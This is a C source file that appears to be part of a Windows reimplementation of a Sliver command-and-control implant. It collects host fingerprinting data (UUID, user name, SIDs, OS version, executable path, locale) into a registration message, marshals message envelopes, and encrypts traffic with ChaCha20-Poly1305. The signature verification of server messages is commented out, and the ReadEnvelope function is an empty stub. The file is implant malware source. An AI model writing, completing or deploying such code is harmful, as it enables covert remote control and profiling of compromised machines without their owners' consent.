#include "pch.h"

VOID FreeEnvelope
(
	_In_ PENVELOPE pEnvelope
)
{
	if (pEnvelope != NULL) {
		if (pEnvelope->pData != NULL) {
			FREE(pEnvelope->pData->pBuffer);
			FREE(pEnvelope->pData);
		}

		FREE(pEnvelope);
	}
}

VOID FreeSliverThreadPool
(
	_In_ PSLIVER_THREADPOOL pSliverPool
)
{
	if (pSliverPool != NULL) {
		if (pSliverPool->pPool != NULL) {
			TpReleasePool(pSliverPool->pPool);
		}

		FREE(pSliverPool);
	}
}

PSLIVER_THREADPOOL InitializeSliverThreadPool(void)
{
	PSLIVER_THREADPOOL pResult = NULL;
	PTP_CLEANUP_GROUP pCleanupGroup = NULL;

	pResult = ALLOC(sizeof(SLIVER_THREADPOOL));
	pResult->pPool = CreateThreadpool(NULL);
	TpSetPoolMaxThreads(pResult->pPool, 8);
	SetThreadpoolCallbackPool(&pResult->CallBackEnviron, pResult->pPool);
	pCleanupGroup = CreateThreadpoolCleanupGroup();
	SetThreadpoolCallbackCleanupGroup(&pResult->CallBackEnviron, pCleanupGroup, NULL);

	return pResult;
}

VOID FreeGlobalConfig
(
	_In_ PGLOBAL_CONFIG pConfig
)
{
	if (pConfig != NULL) {
		FREE(pConfig->pSessionKey);
		FREE(pConfig->lpRecipientPubKey);
		FREE(pConfig->lpPeerPubKey);
		FREE(pConfig->lpPeerPrivKey);
		FREE(pConfig->lpServerMinisignPublicKey);
		FREE(pConfig);
	}
}

PBUFFER RegisterSliver
(
	_In_ PGLOBAL_CONFIG pConfig
)
{
	LPSTR lpUUID = NULL;
	LPSTR lpFullQualifiedName = NULL;
	LPSTR lpUserSid = NULL;
	LPSTR lpGroupSid = NULL;
	SYSTEM_INFO SystemInfo;
	RTL_OSVERSIONINFOW OsVersion;
	LPSTR lpVersion = NULL;
	LPSTR lpHostName = NULL;
	LPSTR lpArch = NULL;
	LPSTR lpModulePath = NULL;
	DWORD cbModulePath = MAX_PATH;
	DWORD dwReturnedLength = 0;
	DWORD dwLastError = 0;
	LPSTR lpLocaleName = NULL;
	WCHAR wszLocale[0x20];
	PBUFFER pResult = NULL;
	DWORD cbResult = 1;
	CHAR szOsName[] = "windows";

	PPBElement pFinalElement = NULL;
	PPBElement ElementList[17];

	lpUUID = GetHostUUID();
	if (lpUUID == NULL) {
		goto CLEANUP;
	}

	lpUUID[lstrlenA(lpUUID) - 1] = '\0';
	lpFullQualifiedName = GetComputerUserName();
	if (lpFullQualifiedName == NULL) {
		goto CLEANUP;
	}

	lpUserSid = GetCurrentProcessUserSID();
	if (lpUserSid == NULL) {
		goto CLEANUP;
	}

	lpGroupSid = GetCurrentProcessGroupSID();
	if (lpGroupSid == NULL) {
		goto CLEANUP;
	}

	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	if (!GetOsVersion(&OsVersion)) {
		LOG_ERROR("GetOsVersion", GetLastError());
		goto CLEANUP;
	}

	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
	GetNativeSystemInfo(&SystemInfo);
	lpVersion = ALLOC(0x100);
	wsprintfA(lpVersion, "%d build %d", OsVersion.dwMajorVersion, OsVersion.dwBuildNumber);
	if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
		lstrcatA(lpVersion, " x86_64");
		lpArch = DuplicateStrA("amd64", 0);
	}
	else if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
		lstrcatA(lpVersion, " x86");
		lpArch = DuplicateStrA("386", 0);
	}
	else {
		lpArch = DuplicateStrA("(NULL)", 0);
	}

	lpHostName = GetHostName();
	lpModulePath = ALLOC(cbModulePath + 1);
	while (TRUE) {
		SecureZeroMemory(lpModulePath, cbModulePath + 1);
		dwReturnedLength = GetModuleFileNameA(NULL, lpModulePath, cbModulePath);
		dwLastError = GetLastError();
		if (dwLastError == ERROR_INSUFFICIENT_BUFFER) {
			cbModulePath *= 2;
			lpModulePath = REALLOC(lpModulePath, cbModulePath + 1);
		}

		break;
	}

	GetSystemDefaultLocaleName(wszLocale, 0x20);
	lpLocaleName = ConvertWcharToChar(wszLocale);
	lpHostName = GetHostName();

	SecureZeroMemory(ElementList, sizeof(ElementList));
	ElementList[0] = CreateBytesElement(pConfig->szSliverName, lstrlenA(pConfig->szSliverName), 1);
	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
	ElementList[3] = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
	ElementList[4] = CreateBytesElement(lpUserSid, lstrlenA(lpUserSid), 5);
	ElementList[5] = CreateBytesElement(lpGroupSid, lstrlenA(lpGroupSid), 6);
	ElementList[6] = CreateBytesElement(szOsName, lstrlenA(szOsName), 7);
	ElementList[7] = CreateBytesElement(lpArch, lstrlenA(lpArch), 8);
	ElementList[8] = CreateVarIntElement(GetCurrentProcessId(), 9);
	ElementList[9] = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
	ElementList[12] = CreateVarIntElement(pConfig->dwReconnectInterval, 13);
	/*if (pSliverClient->HttpConfig.pProxyConfig != NULL && pSliverClient->HttpConfig.pProxyConfig->pUri != NULL) {
		ElementList[13] = CreateBytesElement(pSliverClient->HttpConfig.pProxyConfig->pUri, lstrlenA(pSliverClient->HttpConfig.pProxyConfig->pUri), 14);
	}*/

	ElementList[14] = CreateBytesElement(pConfig->szConfigID, lstrlenA(pConfig->szConfigID), 16);
	ElementList[15] = CreateVarIntElement(pConfig->uPeerID, 17);
	ElementList[16] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);

	pFinalElement = CreateStructElement(ElementList, _countof(ElementList), 0);
	pResult = BufferMove(pFinalElement->pMarshalledData, pFinalElement->cbMarshalledData);
	pFinalElement->pMarshalledData = NULL;
CLEANUP:
	FREE(lpHostName);
	FREE(lpUUID);
	FREE(lpFullQualifiedName);
	FREE(lpUserSid);
	FREE(lpGroupSid);
	FREE(lpArch);
	FREE(lpModulePath);
	FREE(lpVersion);
	FREE(lpLocaleName);
	FreeElement(pFinalElement);

	return pResult;
}

PBUFFER MarshalEnvelope
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement ElementList[4];
	DWORD i = 0;
	PBUFFER pResult = NULL;
	PPBElement pTemp = NULL;

	SecureZeroMemory(ElementList, sizeof(ElementList));
	if (pEnvelope->uID != 0) {
		ElementList[0] = CreateVarIntElement(pEnvelope->uID, 1);
	}

	if (pEnvelope->uType > 0) {
		ElementList[1] = CreateVarIntElement(pEnvelope->uType, 2);
	}

	if (!pEnvelope->uUnknownMessageType) {
		if (pEnvelope->pData != NULL) {
			ElementList[2] = CreateBytesElement(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, 3);
		}
	}
	else {
		ElementList[3] = CreateVarIntElement(TRUE, 4);
	}

	pResult = ALLOC(sizeof(BUFFER));
	pTemp = CreateStructElement(ElementList, 4, 0);
	if (pTemp->SubElements != NULL) {
		for (i = 0; i < pTemp->dwNumberOfSubElement; i++) {
			FreeElement(pTemp->SubElements[i]);
		}

		FREE(pTemp->SubElements);
	}

	pResult = BufferMove(pTemp->pMarshalledData, pTemp->cbMarshalledData);
	pTemp->pMarshalledData = NULL;
	FreeElement(pTemp);
	return pResult;
}

PENVELOPE UnmarshalEnvelope
(
	_In_ PBUFFER pData
)
{
	PPBElement ElementList[4];
	DWORD i = 0;
	PENVELOPE pResult = NULL;

	SecureZeroMemory(ElementList, sizeof(ElementList));
	for (i = 0; i < _countof(ElementList); i++) {
		ElementList[i] = ALLOC(sizeof(PBElement));
		ElementList[i]->dwFieldIdx = i + 1;
	}

	ElementList[0]->Type = Varint;
	ElementList[1]->Type = Varint;
	ElementList[2]->Type = Bytes;
	ElementList[3]->Type = Varint;

	pResult = UnmarshalStruct(ElementList, _countof(ElementList), pData->pBuffer, pData->cbBuffer, NULL);
	for (i = 0; i < _countof(ElementList); i++) {
		FREE(ElementList[i]);
	}

	return pResult;
}

PENVELOPE ReadEnvelope
(
	_In_ PSLIVER_HTTP_CLIENT pSliverClient
)
{
	
}

PENVELOPE CreateErrorRespEnvelope
(
	_In_ LPSTR lpErrorDesc,
	_In_ DWORD dwFieldIdx,
	_In_ UINT64 uEnvelopeID
)
{
	DWORD cbMarshalledFieldIdx = 0;
	PENVELOPE pResult = NULL;
	PPBElement RespElement;
	PPBElement FinalElement;
	PPBElement ElementList[4];

	SecureZeroMemory(ElementList, sizeof(ElementList));
	ElementList[0] = CreateBytesElement(lpErrorDesc, lstrlenA(lpErrorDesc), 1);
	RespElement = CreateStructElement(ElementList, _countof(ElementList), dwFieldIdx);
	FinalElement = CreateStructElement(&RespElement, 1, 0);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->pData = BufferMove(FinalElement->pMarshalledData, FinalElement->cbMarshalledData);
	FinalElement->pMarshalledData = NULL;
	pResult->uID = uEnvelopeID;
	
	FreeElement(ElementList[0]);
	FreeElement(FinalElement);

	return pResult;
}

//PBUFFER SliverBase64Decode
//(
//	_In_ LPSTR lpInput
//)
//{
//	CHAR szOldCharSet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
//	CHAR szNewCharSet[] = "a0b2c5def6hijklmnopqr_st-uvwxyzA1B3C4DEFGHIJKLM7NO9PQR8ST+UVWXYZ";
//	LPSTR lpTemp = NULL;
//	DWORD cbInput = lstrlenA(lpInput);
//	DWORD i = 0;
//	lpTemp = ALLOC(cbInput + 1);
//	DWORD dwPos = 0;
//	PBUFFER pResult = NULL;
//
//	for (i = 0; i < cbInput; i++) {
//		dwPos = StrChrA(szNewCharSet, lpInput[i]) - szNewCharSet;
//		lpTemp[i] = szOldCharSet[dwPos];
//	}
//
//	pResult = ALLOC(sizeof(BUFFER));
//	pResult->pBuffer = Base64Decode(lpTemp, &pResult->cbBuffer);
//	FREE(lpTemp);
//	return pResult;
//}

PBUFFER SliverEncrypt
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PBUFFER pInput
)
{
	PBYTE pNonce = NULL;
	PBUFFER pResult = NULL;

	pNonce = GenRandomBytes(CHACHA20_NONCE_SIZE);
	pResult = ALLOC(sizeof(BUFFER));
	Chacha20Poly1305Encrypt(pConfig->pSessionKey, pNonce, pInput->pBuffer, pInput->cbBuffer, NULL, 0, &pResult->pBuffer, &pResult->cbBuffer);
	pResult->pBuffer = REALLOC(pResult->pBuffer, pResult->cbBuffer + CHACHA20_NONCE_SIZE);
	memcpy(pResult->pBuffer + CHACHA20_NONCE_SIZE, pResult->pBuffer, pResult->cbBuffer);
	memcpy(pResult->pBuffer, pNonce, CHACHA20_NONCE_SIZE);
	pResult->cbBuffer += CHACHA20_NONCE_SIZE;
	FREE(pNonce);

	return pResult;
}

PBUFFER SliverDecrypt
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PBUFFER pCipherText
)
{
	PBUFFER pResult = NULL;
	PMINISIGN_PUB_KEY pDecodedPubKey = NULL;
	PBYTE pTemp = NULL;
	PBYTE pNonce = NULL;
	DWORD cbCipherText = 0;
	BOOL IsOk = FALSE;

	/*if (pCipherText->cbBuffer < MINISIGN_SIZE + 1) {
		goto CLEANUP;
	}

	pDecodedPubKey = DecodeMinisignPublicKey(pConfig->lpServerMinisignPublicKey);
	if (pDecodedPubKey == NULL) {
		goto CLEANUP;
	}

	pTemp = pCipherText->pBuffer;
	if (!VerifySign(pDecodedPubKey, pTemp, pCipherText->cbBuffer, FALSE)) {
		goto CLEANUP;
	}

	pNonce = pTemp + MINISIGN_SIZE;*/
	pTemp = pCipherText->pBuffer;
	pNonce = pTemp;
	pTemp = pNonce + CHACHA20_NONCE_SIZE;
	//cbCipherText = pCipherText->cbBuffer - MINISIGN_SIZE - CHACHA20_NONCE_SIZE;
	cbCipherText = pCipherText->cbBuffer - CHACHA20_NONCE_SIZE;
	pResult = Chacha20Poly1305DecryptAndVerify(pConfig->pSessionKey, pNonce, pTemp, cbCipherText, NULL, 0);
	if (pResult->pBuffer == NULL || pResult->cbBuffer == 0) {
		goto CLEANUP;
	}

	IsOk = TRUE;
CLEANUP:
	if (!IsOk) {
		FreeBuffer(pResult);
	}

	FREE(pDecodedPubKey);

	return pResult;
}